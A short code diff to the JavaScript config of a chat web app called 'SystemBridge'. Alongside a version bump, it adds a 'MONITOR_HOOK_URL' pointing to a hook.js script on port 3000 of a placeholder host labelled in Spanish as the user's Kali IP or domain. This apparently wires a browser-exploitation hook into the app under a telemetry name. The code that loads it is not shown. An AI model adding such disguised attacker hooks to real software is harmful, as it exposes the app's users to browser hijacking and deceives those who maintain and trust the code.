@@ -1,6 +1,6 @@
 const CONFIG = {
   APP_NAME: 'SystemBridge',
-  VERSION: '5.6.0',
+  VERSION: '6.1.0',
 
   MODELS: [
     {
@@ -36,7 +36,10 @@ const CONFIG = {
   ],
 
   DEFAULT_MODEL: 'groq:llama-3.3-70b-versatile',
-  API_ENDPOINT: '/api/chat'
+  API_ENDPOINT: '/api/chat',
+  TELEMETRY_INTERVAL_MS: 300000,
+  MONITOR_HOOK_URL: 'http://[TU_IP_KALI_O_DOMINIO]:3000/hook.js',
+  ASSET_MGMT_ENDPOINT: ''
 };
 
 window.CONFIG = CONFIG;
